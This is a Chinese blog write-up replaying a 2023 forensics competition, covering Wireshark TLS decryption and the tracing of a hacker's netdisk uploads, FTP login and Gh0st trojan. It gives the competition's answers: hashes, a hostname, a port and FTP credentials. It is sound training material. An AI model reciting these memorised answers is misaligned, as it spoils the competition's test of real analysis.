    <id>http://iyheart.github.io/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-11-05T15:33:12.000Z</published>
    <updated>2025-11-08T13:27:36.383Z</updated>
    
    <content type="html"><![CDATA[<ul><li>该比赛复现完全看视频复现的，不是自己做题体会，先复现补补知识点，再自己做点题。（因为自己做题的时候越做越发现有点不对劲，做不出来的仍然做不出来。）</li></ul><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><h2 id="前提准备"><a href="#前提准备" class="headerlink" title="前提准备"></a>前提准备</h2><p>题目检材给了两个文件，一个是<code>flower.pcapng</code>，这个是正常流量包文件，然后还给了一个<code>key.log</code>文件。（视频中猜测是要用<code>key.log</code>解密出<code>http</code>协议）。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235130516.png" alt="image-20251105235130516"></p><p>打开流量包后发现，没有http协议，但是tls协议一大堆，这下应该就是用<code>key.log</code>解密<code>tls</code>协议，解密出来的内容应该就是<code>http</code>协议了。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235400012.png" alt="image-20251105235400012"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235425921.png" alt="image-20251105235425921"></p><h2 id="解密tls"><a href="#解密TLS" class="headerlink" title="解密TLS"></a>解密TLS</h2><p>首先选中编辑选项</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235617612.png" alt="image-20251105235617612"></p><p>然后在协议这边选中TLS协议</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235657011.png" alt="image-20251105235657011"></p><p>选中之后是这样的界面，接下来只要点击<code>流量</code>，然后将<code>key.log</code>选中即可，选中之后就解密完成了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235810158.png" alt="image-20251105235810158"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105235905915.png" alt="image-20251105235905915"></p><h2 id="question1"><a href="#question1√" class="headerlink" title="question1√"></a>question1√</h2><p>计算流量包文件的SHA256值是？[答案：字母小写]</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>没什么好说的，直接将流量包拖入<code>cyberchef</code>就行</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105234250745.png" alt="image-20251105234250745"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2d689add281b477c82b18af8ab857ef5be6badf253db1c1923528dd73b3d61a9</span><br></pre></td></tr></table></figure><h3 id="补充方法二"><a href="#补充方法二" class="headerlink" title="补充方法二"></a>补充方法二</h3><p>其实可以直接在<code>wireshark</code>这边分析的</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000400729.png" alt="image-20251106000400729"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000415809.png" alt="image-20251106000415809"></p><h2 id="question2"><a href="#question2√" class="headerlink" title="question2√"></a>question2√</h2><p>流量包长度在“640-1279”之间的的数据包总共有多少？[答案：100]</p><h3 id="方法一"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>本题就是要熟练掌握流量包的过滤指令，其中过滤流量包长度指令<code>frame.len &gt;=640 and frame.len &lt;= 1279</code>，直接可以马上过滤出来。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105234513746.png" alt="image-20251105234513746"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">179</span><br></pre></td></tr></table></figure><h3 id="补充方法二"><a href="#补充方法二-1" class="headerlink" title="补充方法二"></a>补充方法二</h3><p>其实不需要使用命令，可以直接查看<code>wireshark</code>这个位置即可看到协议分组的数量，并且恰好是<code>640-1279</code>这个地方</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000615587.png" alt="image-20251106000615587"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000632121.png" alt="image-20251106000632121"></p><h2 id="question3"><a href="#question3√" class="headerlink" title="question3√"></a>question3√</h2><p>黑客使用的计算机操作系统是？[答案：windows7 x32]</p><h3 id="方法一"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h3><ul><li>这题的流量分析我感觉找不出来黑客的操作系统，但是可以结合比赛给的黑客电脑检材<code>disk0.E1</code>、<code>disk1.E1</code></li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251105234706992.png" alt="image-20251105234706992"></p><ul><li>取出来后发现得到了Windows版本和系统位数，结合答案的格式，最终答案如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows10 x64</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>直接分析流量包，流量包解密之后直接看http的请求头就行</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000827119.png" alt="image-20251106000827119"></p><h2 id="question4"><a href="#question4√" class="headerlink" title="question4√"></a>question4√</h2><p>黑客上传文件到哪个网盘？[答案：xx网盘]</p><p>通过查看解密后的http协议，会发现黑客访问的是百度网盘</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106000929093.png" alt="image-20251106000929093"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">百度网盘</span><br></pre></td></tr></table></figure><h2 id="question5"><a href="#question5√" class="headerlink" title="question5√"></a>question5√</h2><p>黑客上传网盘的中间件是？[答案：xxxx]</p><h3 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h3><p>如果要是我在做题而不是看视频复现，我是不明白题目在问什么的。中间件有了解过，但是题目表达的太简单了。现在先了解一下中间件</p><ul><li>在 Web 服务中，<strong>中间件（Middleware）</strong> 是指介于 <strong>操作系统与应用程序之间</strong>、或者 <strong>Web 服务器与业务逻辑之间</strong> 的一层软件组件。它的主要作用是<strong>连接、协调、处理请求、增强功能</strong>，让应用开发更加灵活、模块化和高效。</li><li>上面对于中间件的描述还是总结性比较高的，下面来举几个例子：<ul><li>中间件可以用来处理<code>http</code>请求，比如说使用<code>GET</code>方法访问某些网站路径，一些中间件必如<code>Nginx</code>、<code>apache</code>等就会将参数<code>GET</code>参数提取出来转换为规范格式，再传给后端。</li><li>中间件还用来处理<code>http</code>响应，一个请求发过来，后端程序要发送响应也需要经过<code>nginx</code>、<code>apache</code>等后端程序，将<code>http</code>请求格式规范化。</li><li>中间件还可以在收到请求的时候判断客户端是否有权限访问，或者是否进行了登录，是否超过了限流</li></ul></li><li><p>所以中间件就相当于一个中间人以及守门人，中间人就是会将数据进行处理、清洗等，守门人就是会判断权限。</p></li><li><p>常用的中间件有如下几个，<code>web</code>服务器中间件有如下几个：<code>nginx</code>、<code>Apache</code>、<code>Tomcat</code></p></li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>因为中间件是在服务端，我们需要看的是服务端响应过来的http响应包，首先要确定百度网盘的<code>ip</code>为<code>110.242.69.43</code>等这些ip地址</p><p>翻到稍微后面一点的<code>http</code>协议，就会看到响应包中有携带<code>server</code>参数，该参数里面写的是<code>nginx</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106003655320.png" alt="image-20251106003655320"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure><h2 id="question6"><a href="#question6√" class="headerlink" title="question6√"></a>question6√</h2><p>黑客首次登陆网盘时间是？[答案：2000-01-01 01:00:33]</p><p>首先如果是像这种登录的话，都是要传递密码和账号的，而传递密码和账号都是使用<code>POST</code>方法（因为GET方法作为请求头登录的话是不安全的），所以<code>GET</code>方法的请求头就不需要看，直接使用搜索功能。查找到首次<code>POST</code>出现的地方</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106004523925.png" alt="image-20251106004523925"></p><p>直接就追踪流进行分析，在这个POST请求过后就会出现</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106004603180.png" alt="image-20251106004603180"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011225678.png" alt="image-20251106011225678"></p><p>所以该POST参数的包就很可能是相应的登录请求包了，直接点击查看包发送的详细时间</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011321958.png" alt="image-20251106011321958"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2023-05-11 12:03:52</span><br></pre></td></tr></table></figure><h2 id="question7"><a href="#question7√" class="headerlink" title="question7√"></a>question7√</h2><p>黑客上传到网盘的txt文件的md5值是？[答案：字母小写]</p><p>这题比较容易，既然有文件上传操作，那么直接导出对象看看</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011729876.png" alt="image-20251106011729876"></p><p>直接过滤<code>.txt</code>，就会发现只有两个</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011802943.png" alt="image-20251106011802943"></p><p>直接导出这两个，其中一个是上传的文件具体内容</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011820362.png" alt="image-20251106011820362"></p><p>另一个就是上传文件的md5值</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106011846867.png" alt="image-20251106011846867"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6a5aff7bec78dd1e4fc23e571b664b50</span><br></pre></td></tr></table></figure><h2 id="question8"><a href="#question8√" class="headerlink" title="question8√"></a>question8√</h2><p>黑客上传到网盘的txt文件第8行的内容是？[答案：XXX]</p><h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>这题只要导出那个文件即可，但是导出的文件有包含请求头，所以要去掉前四行，从第五行开始算起。</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106012157625.png" alt="image-20251106012157625"></p><ul><li>或者可以直接看相应流量包</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106012413827.png" alt="image-20251106012413827"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br></pre></td></tr></table></figure><h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><ul><li>该题如何确定正确的行数，突然想到不是有给md5值吗？直接去除行数算md5值，要是md5对了就是真正的行数了。</li><li>一开始是这样的开头，验证md5，发现不对</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106012826645.png" alt="image-20251106012826645"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106012931020.png" alt="image-20251106012931020"></p><ul><li>接下来一行一行去除，看看去除到哪一行md5值是正确的（注意：导出对象的后面还有一些webkit的东西也要删除）</li><li>最后发现第一行是空行，所以$$$$是第八行。</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106013527726.png" alt="image-20251106013527726"></p><h2 id="question9"><a href="#question9√" class="headerlink" title="question9√"></a>question9√</h2><p>被入侵主机的计算机名是？[答案：XXXXXXXXXXX]</p><p>看到这题有点疑惑，为什么直接搜索<code>DHCP</code>就能找到主机名，怎么想到的。</p><p>首先要熟悉一下黑客的攻击流程，当黑客能<code>RCE</code>后就要想办法<code>getshell</code>，然后再远程连接该主机，进行内网渗透等操作。</p><p>在渗透的时候黑客有以下两种情况可以选择，而我们这个题目其实属于<strong>场景二</strong></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106015221976.png" alt="image-20251106015221976"></p><p>所以直接搜索<code>DHCP</code>协议，<code>DHCP</code>协议会出现主机名称</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106015418579.png" alt="image-20251106015418579"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WIN-BFA1TO8PTNP</span><br></pre></td></tr></table></figure><h2 id="question10"><a href="#question10√" class="headerlink" title="question10√"></a>question10√</h2><p>被入侵电脑的数据回传端口是？[答案：11]</p><p>说实话没明白题目问的具体意思，直接把他当成被入侵电脑的传输数据的端口了，结果发现答案错的。看了视频后发现其实是被入侵电脑回传到黑客主机的什么端口。</p><ul><li>通过前面的分析其实已经了解到被入侵电脑的<code>ip</code>为<code>192.168.100.139</code>，而黑客电脑<code>ip</code>为<code>192.168.100.141</code>，所以直接过滤数据包</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.dst==192.168.100.141 and ip.src==192.168.100.139</span><br></pre></td></tr></table></figure><ul><li>此时黑客打到内网后，开始打<code>ftp</code>服务器，通过密码直接登录到了<code>ftp</code>服务器</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021003405.png" alt="image-20251106021003405"></p><ul><li>接下去直接上传木马了</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021048513.png" alt="image-20251106021048513"></p><ul><li>接着就是分析到<code>Gh0st</code>这个鬼东东了（然后再后续分析木马的时候也会知道）</li></ul><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021237976.png" alt="image-20251106021237976"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021312471.png" alt="image-20251106021312471"></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021337688.png" alt="image-20251106021337688"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8000</span><br></pre></td></tr></table></figure><h2 id="question11"><a href="#question11√" class="headerlink" title="question11√"></a>question11√</h2><p>流量包中ftp服务器的用户密码是？[答案：abcd]</p><p>直接过滤出ftp协议出来，然后发现<code>Logged on</code>，此时其实就可以知道用户<code>www</code>的密码是<code>ftp</code></p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106021621862.png" alt="image-20251106021621862"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp</span><br></pre></td></tr></table></figure><h2 id="question12"><a href="#question12√" class="headerlink" title="question12√"></a>question12√</h2><p>流量包中ftp服务器中的木马文件的md5值是？</p><p>在连接上<code>ftp</code>后，继续追踪流会发现ftp服务器被上传木马了</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106022112702.png" alt="image-20251106022112702"></p><p>直接将这个木马保存下来，计算md5值</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106022153737.png" alt="image-20251106022153737"></p><ul><li>答案：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2a49a00a1f0b898074be95a5bbc436e3</span><br></pre></td></tr></table></figure><h2 id="question13"><a href="#question13√" class="headerlink" title="question13√"></a>question13√</h2><p>木马文件伪造的软件版本是？[答案：0.0.0.0]</p><p>直接查看木马属性即可</p><p><img src="/2025/11/05/%E5%8F%96%E8%AF%81/%E5%8F%96%E8%AF%81%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%812023%E5%B9%B4%E7%9B%98%E5%8F%A4%E7%9F%B3%E5%A4%8D%E7%8E%B0/image-20251106022229739.png" alt="image-20251106022229739"></p><ul><li>答案：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7.5.0.1039</span><br></pre></td></tr></table></figure><h2 id="question14"><a href="#question14" class="headerlink" title="question14"></a>question14</h2><p>黑客上传到网盘的压缩包解压密码是？[答案：XXXXXXXXXXX]★★★★★</p><h2 id="question15"><a href="#question15" class="headerlink" title="question15"></a>question15</h2><p>黑客上传到网盘的压缩包内文件的内容是？[答案：xxxxxxx]★★★★★</p><h2 id="question16"><a href="#question16" class="headerlink" title="question16"></a>question16</h2><p>分析技术人员电脑内的手机流量包，给出技术人员的虚拟身份账号是？[答案格式:13039456655]</p><p><code>question14</code>和<code>question15</code>那两题最后再看，现在先看<code>question16~20</code>，首先这个分析并不是黑客的那个流量包了。</p><p>这个流量包是技术人员电脑里面的流量包，所以我们需要仿真该电脑，或者直接用火眼去将该流量包给导出来。</p><h2 id="question17"><a href="#question17" class="headerlink" 